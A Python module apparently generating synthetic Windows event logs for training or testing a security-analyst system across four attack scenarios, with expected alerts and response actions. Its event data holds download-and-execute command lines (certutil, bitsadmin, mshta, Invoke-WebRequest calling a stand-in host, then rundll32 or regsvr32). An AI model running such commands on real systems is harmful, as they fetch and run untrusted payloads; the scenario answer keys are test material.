from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta
import random
from typing import Callable

import pandas as pd

from ai_analyst.schemas import ALLOWED_ACTION_IDS
from data_generation.attack_simulator import NORMALIZED_EVENT_COLUMNS, _create_event


DIFFICULTIES = {"Easy", "Medium", "Hard"}
NOISE_LEVELS = {"None", "Low", "Medium", "High"}
SCENARIO_EVENT_COLUMNS = ["EventID", *NORMALIZED_EVENT_COLUMNS]


@dataclass(frozen=True)
class ScenarioDefinition:
    scenario_id: str
    scenario_name: str
    description: str
    generator: Callable[[random.Random, str, str, str], dict[str, object]]


def _inventory_targets(environment: str) -> list[dict[str, str]]:
    targets = [
        {"DeviceName": "Admin-PC", "UserName": "admin.user", "Role": "Administrator Workstation", "Criticality": "High"},
        {"DeviceName": "CEO-PC", "UserName": "ceo.user", "Role": "Executive Workstation", "Criticality": "Critical"},
        {"DeviceName": "CFO-PC", "UserName": "cfo.user", "Role": "Finance Workstation", "Criticality": "Critical"},
        {"DeviceName": "HR-PC", "UserName": "hr.user", "Role": "HR Workstation", "Criticality": "High"},
        {"DeviceName": "SERVER-01", "UserName": "svc.database", "Role": "Database Server", "Criticality": "Critical"},
        {"DeviceName": "TEST-PC", "UserName": "test.user", "Role": "Testing Workstation", "Criticality": "Low"},
    ]
    if environment == "Finance SME":
        return [target for target in targets if target["DeviceName"] in {"CFO-PC", "CEO-PC", "Admin-PC", "SERVER-01", "HR-PC"}]
    return targets


def _target(rng: random.Random, environment: str, scenario_id: str) -> dict[str, str]:
    targets = _inventory_targets(environment)
    if scenario_id in {"malware_download_execution", "command_control_beaconing", "multi_stage_intrusion"}:
        weighted = [target for target in targets for _ in range(3 if target["Criticality"] in {"High", "Critical"} else 1)]
        return rng.choice(weighted)
    return rng.choice(targets)


def _event_id(scenario_id: str, seed: int, index: int, kind: str) -> str:
    return f"{scenario_id}-{seed}-{kind}-{index:03d}"


def _event(seed: int, scenario_id: str, index: int, kind: str, **kwargs: object) -> dict[str, object]:
    event = _create_event(**kwargs)
    return {"EventID": _event_id(scenario_id, seed, index, kind), **event}


def _difficulty_config(difficulty: str) -> dict[str, int | float]:
    configs = {
        "Easy": {"delay_max": 2, "spray_users": 8, "spray_attempts": 8, "beacon_jitter": 2, "beacon_count": 6},
        "Medium": {"delay_max": 5, "spray_users": 7, "spray_attempts": 9, "beacon_jitter": 6, "beacon_count": 6},
        "Hard": {"delay_max": 8, "spray_users": 5, "spray_attempts": 8, "beacon_jitter": 10, "beacon_count": 5},
    }
    return configs[difficulty]


def _noise_count(noise_level: str) -> int:
    return {"None": 0, "Low": 3, "Medium": 8, "High": 16}[noise_level]


def _benign_noise(rng: random.Random, seed: int, scenario_id: str, start_time: datetime, environment: str, noise_level: str) -> list[dict[str, object]]:
    count = _noise_count(noise_level)
    targets = _inventory_targets(environment)
    events: list[dict[str, object]] = []
    for index in range(count):
        target = rng.choice(targets)
        event_time = start_time + timedelta(minutes=rng.randint(0, 28), seconds=rng.randint(0, 50))
        kind = rng.choice(["login", "browser", "service", "admin_ps"])
        if kind == "login":
            event = _event(
                seed,
                scenario_id,
                index,
                "benign",
                event_time=event_time,
                device_name=target["DeviceName"],
                user_name=target["UserName"],
                windows_event_id=4624,
                event_source="Microsoft-Windows-Security-Auditing",
                event_type="Authentication",
                event_result="Success",
                event_severity="Informational",
                source_ip=f"10.0.0.{rng.randint(10, 200)}",
                destination_ip=target["DeviceName"],
                raw_message="Synthetic normal user logon.",
            )
        elif kind == "browser":
            event = _event(
                seed,
                scenario_id,
                index,
                "benign",
                event_time=event_time,
                device_name=target["DeviceName"],
                user_name=target["UserName"],
                windows_event_id=3,
                event_source="Microsoft-Windows-Sysmon",
                event_type="Network Connection",
                event_result="Success",
                event_severity="Informational",
                source_ip=f"10.0.0.{rng.randint(10, 200)}",
                destination_ip="10.0.1.10",
                process_name="chrome.exe",
                raw_message="Synthetic ordinary internal browser traffic.",
            )
        elif kind == "admin_ps":
            event = _event(
                seed,
                scenario_id,
                index,
                "benign",
                event_time=event_time,
                device_name=target["DeviceName"],
                user_name=target["UserName"],
                windows_event_id=4104,
                event_source="Microsoft-Windows-PowerShell",
                event_type="PowerShell Script Block",
                event_result="Success",
                event_severity="Informational",
                source_ip="10.0.0.5",
                process_name="powershell.exe",
                command_line="Get-Process",
                raw_message="Synthetic normal administrative PowerShell inventory check.",
            )
        else:
            event = _event(
                seed,
                scenario_id,
                index,
                "benign",
                event_time=event_time,
                device_name=target["DeviceName"],
                user_name="SYSTEM",
                windows_event_id=7036,
                event_source="Service Control Manager",
                event_type="Service",
                event_result="Success",
                event_severity="Informational",
                raw_message="Synthetic normal service state change.",
            )
        events.append(event)
    return events


def _finish_scenario(
    *,
    scenario_id: str,
    scenario_name: str,
    description: str,
    difficulty: str,
    seed: int,
    events: list[dict[str, object]],
    attack_event_ids: list[str],
    benign_event_ids: list[str],
    expected_incident_type: str,
    expected_minimum_severity: str,
    expected_mitre: list[str],
    expected_target: str,
    expected_alerts: list[str],
    expected_actions: list[str],
    metadata: dict[str, object],
) -> dict[str, object]:
    frame = pd.DataFrame(events, columns=SCENARIO_EVENT_COLUMNS)
    frame["EventTime"] = pd.to_datetime(frame["EventTime"], errors="coerce")
    frame = frame.sort_values(["EventTime", "EventID"]).reset_index(drop=True)
    return {
        "ScenarioID": scenario_id,
        "ScenarioName": scenario_name,
        "Description": description,
        "Difficulty": difficulty,
        "Seed": seed,
        "GeneratedEvents": frame,
        "ExpectedIncidentType": expected_incident_type,
        "ExpectedMinimumSeverity": expected_minimum_severity,
        "ExpectedMITRETechniques": expected_mitre,
        "ExpectedTarget": expected_target,
        "ExpectedAlertTypes": expected_alerts,
        "ExpectedRecommendedActions": expected_actions,
        "AttackEventIDs": attack_event_ids,
        "BenignEventIDs": benign_event_ids,
        "GenerationMetadata": metadata,
    }


def _scenario_seed(rng: random.Random) -> int:
    return rng.randint(100000, 999999)


def _base_start(rng: random.Random) -> datetime:
    return datetime(2026, 7, 21, rng.randint(1, 18), rng.randint(0, 20), 0)


def _multi_stage(rng: random.Random, difficulty: str, noise_level: str, environment: str) -> dict[str, object]:
    seed = _scenario_seed(rng)
    scenario_id = "multi_stage_intrusion"
    target = _target(rng, environment, scenario_id)
    config = _difficulty_config(difficulty)
    start = _base_start(rng)
    attacker_ip = f"203.0.113.{rng.randint(20, 230)}"
    destination_ip = rng.choice(["198.51.100.25", "203.0.113.77", "192.0.2.44"])
    events: list[dict[str, object]] = []
    attack_ids: list[str] = []
    failed_count = 5 + (1 if difficulty == "Easy" else 0)
    for index in range(failed_count):
        event = _event(seed, scenario_id, index, "attack", event_time=start + timedelta(minutes=index), device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=4625, event_source="Microsoft-Windows-Security-Auditing", event_type="Authentication", event_result="Failure", event_severity="High", source_ip=attacker_ip, destination_ip=target["DeviceName"], country="Unknown", raw_message="Synthetic failed logon in multi-stage scenario.")
        events.append(event); attack_ids.append(event["EventID"])
    success_index = failed_count
    event = _event(seed, scenario_id, success_index, "attack", event_time=start + timedelta(minutes=failed_count), device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=4624, event_source="Microsoft-Windows-Security-Auditing", event_type="Authentication", event_result="Success", event_severity="High", source_ip=attacker_ip, destination_ip=target["DeviceName"], country="Unknown", raw_message="Synthetic successful logon after failures.")
    events.append(event); attack_ids.append(event["EventID"])
    ps_time = start + timedelta(minutes=failed_count + rng.randint(1, int(config["delay_max"])))
    for offset, command in enumerate(["powershell.exe -EncodedCommand SIMULATED_SAFE_PAYLOAD", "Write-Output 'RAVEN-SOC simulation only'"]):
        event = _event(seed, scenario_id, success_index + offset + 1, "attack", event_time=ps_time + timedelta(minutes=offset), device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=1 if offset == 0 else 4104, event_source="Microsoft-Windows-Sysmon" if offset == 0 else "Microsoft-Windows-PowerShell", event_type="Process Creation" if offset == 0 else "PowerShell Script Block", event_result="Success", event_severity="High", source_ip=attacker_ip, process_name="powershell.exe", parent_process_name="explorer.exe", command_line=command, country="Unknown", raw_message="Synthetic suspicious PowerShell event.")
        events.append(event); attack_ids.append(event["EventID"])
    net = _event(seed, scenario_id, 99, "attack", event_time=ps_time + timedelta(minutes=2), device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=3, event_source="Microsoft-Windows-Sysmon", event_type="Network Connection", event_result="Success", event_severity="High", source_ip=f"192.168.1.{rng.randint(20, 220)}", destination_ip=destination_ip, process_name="powershell.exe", parent_process_name="explorer.exe", country="Unknown", raw_message="Synthetic suspicious outbound connection.")
    events.append(net); attack_ids.append(net["EventID"])
    noise = _benign_noise(rng, seed, scenario_id, start, environment, noise_level)
    events.extend(noise)
    return _finish_scenario(scenario_id=scenario_id, scenario_name="Multi-Stage Intrusion", description="Authentication compromise followed by execution and outbound activity.", difficulty=difficulty, seed=seed, events=events, attack_event_ids=attack_ids, benign_event_ids=[event["EventID"] for event in noise], expected_incident_type="Multi-Stage Intrusion", expected_minimum_severity="Critical", expected_mitre=["T1110 - Brute Force", "T1078 - Valid Accounts", "T1059.001 - PowerShell", "T1071 - Application Layer Protocol"], expected_target=target["DeviceName"], expected_alerts=["Failed Login Burst", "Successful Login After Failures", "Suspicious PowerShell", "Suspicious Outbound Connection"], expected_actions=["ISOLATE_DEVICE"], metadata={"TargetRole": target["Role"], "DestinationIP": destination_ip})


def _password_spray(rng: random.Random, difficulty: str, noise_level: str, environment: str) -> dict[str, object]:
    seed = _scenario_seed(rng); scenario_id = "password_spray_attempt"; target = _target(rng, environment, scenario_id); config = _difficulty_config(difficulty); start = _base_start(rng); source_ip = f"203.0.113.{rng.randint(20, 230)}"
    users = ["admin", "alice", "bob", "carol", "dave", "erin", "frank", "grace", "morgan", target["UserName"]]
    rng.shuffle(users)
    user_count = int(config["spray_users"])
    attempts = max(int(config["spray_attempts"]), user_count)
    selected_users = users[:user_count]
    events: list[dict[str, object]] = []; attack_ids: list[str] = []
    for index in range(attempts):
        user = selected_users[index % len(selected_users)]
        event = _event(seed, scenario_id, index, "attack", event_time=start + timedelta(minutes=index), device_name=target["DeviceName"], user_name=user, windows_event_id=4625, event_source="Microsoft-Windows-Security-Auditing", event_type="Authentication", event_result="Failure", event_severity="High", source_ip=source_ip, destination_ip=target["DeviceName"], country="Unknown", raw_message="Synthetic password spray failed logon.")
        events.append(event); attack_ids.append(event["EventID"])
    if difficulty != "Hard":
        event = _event(seed, scenario_id, 90, "attack", event_time=start + timedelta(minutes=attempts + 1), device_name=target["DeviceName"], user_name=selected_users[-1], windows_event_id=4624, event_source="Microsoft-Windows-Security-Auditing", event_type="Authentication", event_result="Success", event_severity="High", source_ip=source_ip, destination_ip=target["DeviceName"], country="Unknown", raw_message="Synthetic optional successful logon after spray.")
        events.append(event); attack_ids.append(event["EventID"])
    noise = _benign_noise(rng, seed, scenario_id, start, environment, noise_level); events.extend(noise)
    return _finish_scenario(scenario_id=scenario_id, scenario_name="Password Spray Attempt", description="One source attempts authentication across multiple users.", difficulty=difficulty, seed=seed, events=events, attack_event_ids=attack_ids, benign_event_ids=[event["EventID"] for event in noise], expected_incident_type="Password Spray Attempt", expected_minimum_severity="High", expected_mitre=["T1110.003 - Password Spraying"], expected_target=source_ip, expected_alerts=["Password Spray"], expected_actions=["BLOCK_DESTINATION_IP"], metadata={"SourceIP": source_ip, "TargetedUsers": selected_users})


def _malware(rng: random.Random, difficulty: str, noise_level: str, environment: str) -> dict[str, object]:
    seed = _scenario_seed(rng); scenario_id = "malware_download_execution"; target = _target(rng, environment, scenario_id); start = _base_start(rng); config = _difficulty_config(difficulty)
    downloader = rng.choice(["powershell.exe", "certutil.exe", "bitsadmin.exe", "mshta.exe"])
    command_by_process = {
        "powershell.exe": "powershell.exe Invoke-WebRequest https://updates.example.test/agent.bin -OutFile payload.exe",
        "certutil.exe": "certutil.exe -urlcache -split -f https://updates.example.test/agent.bin payload.exe",
        "bitsadmin.exe": "bitsadmin.exe /transfer job https://updates.example.test/agent.bin payload.exe",
        "mshta.exe": "mshta.exe https://updates.example.test/loader.hta",
    }
    executor = rng.choice(["rundll32.exe", "regsvr32.exe", "wscript.exe", "payload.exe"])
    execution_command = f"{executor} payload.dll,Start" if executor in {"rundll32.exe", "regsvr32.exe"} else f"{executor} payload.exe"
    download = _event(seed, scenario_id, 0, "attack", event_time=start, device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=1, event_source="Microsoft-Windows-Sysmon", event_type="Process Creation", event_result="Success", event_severity="High", source_ip="10.0.0.20", process_name=downloader, parent_process_name=rng.choice(["chrome.exe", "winword.exe", "explorer.exe"]), command_line=command_by_process[downloader], country="Unknown", raw_message="Synthetic download-capable process event.")
    execute = _event(seed, scenario_id, 1, "attack", event_time=start + timedelta(minutes=rng.randint(1, int(config["delay_max"]))), device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=1, event_source="Microsoft-Windows-Sysmon", event_type="Process Creation", event_result="Success", event_severity="High", source_ip="10.0.0.20", process_name=executor, parent_process_name=downloader, command_line=execution_command, country="Unknown", raw_message="Synthetic payload execution representation.")
    events = [download, execute]; attack_ids = [download["EventID"], execute["EventID"]]
    if difficulty == "Easy":
        outbound = _event(seed, scenario_id, 2, "attack", event_time=start + timedelta(minutes=int(config["delay_max"]) + 1), device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=3, event_source="Microsoft-Windows-Sysmon", event_type="Network Connection", event_result="Success", event_severity="High", source_ip="10.0.0.20", destination_ip="198.51.100.25", process_name=executor, country="Unknown", raw_message="Synthetic optional outbound connection after execution.")
        events.append(outbound); attack_ids.append(outbound["EventID"])
    noise = _benign_noise(rng, seed, scenario_id, start, environment, noise_level); events.extend(noise)
    return _finish_scenario(scenario_id=scenario_id, scenario_name="Malware Download and Execution", description="Synthetic transfer activity followed by executable or script execution.", difficulty=difficulty, seed=seed, events=events, attack_event_ids=attack_ids, benign_event_ids=[event["EventID"] for event in noise], expected_incident_type="Malware Download and Execution", expected_minimum_severity="High", expected_mitre=["T1105 - Ingress Tool Transfer", "T1218 - System Binary Proxy Execution", "T1204 - User Execution"], expected_target=target["DeviceName"], expected_alerts=["Suspicious Download Command", "Suspicious File Execution"], expected_actions=["ISOLATE_DEVICE"], metadata={"Downloader": downloader, "Executor": executor})


def _beaconing(rng: random.Random, difficulty: str, noise_level: str, environment: str) -> dict[str, object]:
    seed = _scenario_seed(rng); scenario_id = "command_control_beaconing"; target = _target(rng, environment, scenario_id); start = _base_start(rng); config = _difficulty_config(difficulty)
    destination = rng.choice(["198.51.100.25", "203.0.113.77", "192.0.2.44"])
    process = rng.choice(["svc.exe", "updater.exe", "powershell.exe"])
    interval = rng.randint(55, 75); jitter = int(config["beacon_jitter"]); count = int(config["beacon_count"])
    events: list[dict[str, object]] = []; attack_ids: list[str] = []
    elapsed = 0
    for index in range(count):
        elapsed = index * interval + rng.randint(-jitter, jitter)
        event = _event(seed, scenario_id, index, "attack", event_time=start + timedelta(seconds=max(0, elapsed)), device_name=target["DeviceName"], user_name=target["UserName"], windows_event_id=3, event_source="Microsoft-Windows-Sysmon", event_type="Network Connection", event_result="Success", event_severity="High", source_ip=f"10.0.0.{rng.randint(20, 220)}", destination_ip=destination, process_name=process, parent_process_name="services.exe", country="Unknown", raw_message="Synthetic regular outbound beacon record.")
        events.append(event); attack_ids.append(event["EventID"])
    noise = _benign_noise(rng, seed, scenario_id, start, environment, noise_level); events.extend(noise)
    return _finish_scenario(scenario_id=scenario_id, scenario_name="Command-and-Control Beaconing", description="Regular synthetic outbound connections to one external destination.", difficulty=difficulty, seed=seed, events=events, attack_event_ids=attack_ids, benign_event_ids=[event["EventID"] for event in noise], expected_incident_type="Command-and-Control Beaconing", expected_minimum_severity="High", expected_mitre=["T1071 - Application Layer Protocol"], expected_target=target["DeviceName"], expected_alerts=["Command-and-Control Beaconing"], expected_actions=["ISOLATE_DEVICE"], metadata={"DestinationIP": destination, "ProcessName": process, "IntervalSeconds": interval})


SCENARIOS: dict[str, ScenarioDefinition] = {
    "multi_stage_intrusion": ScenarioDefinition("multi_stage_intrusion", "Multi-Stage Intrusion", "Authentication compromise followed by execution and outbound activity.", _multi_stage),
    "password_spray_attempt": ScenarioDefinition("password_spray_attempt", "Password Spray Attempt", "One source targets many users with failed authentication.", _password_spray),
    "malware_download_execution": ScenarioDefinition("malware_download_execution", "Malware Download and Execution", "Download-capable process followed by suspicious execution.", _malware),
    "command_control_beaconing": ScenarioDefinition("command_control_beaconing", "Command-and-Control Beaconing", "Regular outbound beacon-like traffic.", _beaconing),
}


def _normalize_scenario_name(name: str) -> str:
    key = str(name).strip().lower().replace("-", "_").replace(" ", "_")
    aliases = {definition.scenario_name.lower().replace("-", "_").replace(" ", "_"): scenario_id for scenario_id, definition in SCENARIOS.items()}
    return aliases.get(key, key)


def list_scenarios() -> list[dict[str, str]]:
    return [
        {"ScenarioID": definition.scenario_id, "ScenarioName": definition.scenario_name, "Description": definition.description}
        for definition in SCENARIOS.values()
    ]


def generate_scenario(
    name: str,
    seed: int | None = None,
    difficulty: str = "Medium",
    noise_level: str = "Low",
    environment: str = "Finance SME",
) -> dict[str, object]:
    if difficulty not in DIFFICULTIES:
        raise ValueError(f"Unsupported difficulty: {difficulty}.")
    if noise_level not in NOISE_LEVELS:
        raise ValueError(f"Unsupported noise level: {noise_level}.")
    scenario_id = _normalize_scenario_name(name)
    if scenario_id not in SCENARIOS:
        raise ValueError(f"Unknown synthetic scenario: {name}.")
    rng = random.Random(0 if seed is None else int(seed))
    scenario = SCENARIOS[scenario_id].generator(rng, difficulty, noise_level, environment)
    scenario["Seed"] = 0 if seed is None else int(seed)
    scenario["GenerationMetadata"] = {
        **dict(scenario.get("GenerationMetadata", {})),
        "Environment": environment,
        "NoiseLevel": noise_level,
    }
    return scenario


def generate_random_scenario(
    seed: int | None = None,
    difficulty: str = "Medium",
    noise_level: str = "Low",
    environment: str = "Finance SME",
) -> dict[str, object]:
    rng = random.Random(0 if seed is None else int(seed))
    scenario_id = rng.choice(sorted(SCENARIOS))
    return generate_scenario(scenario_id, seed=0 if seed is None else int(seed), difficulty=difficulty, noise_level=noise_level, environment=environment)
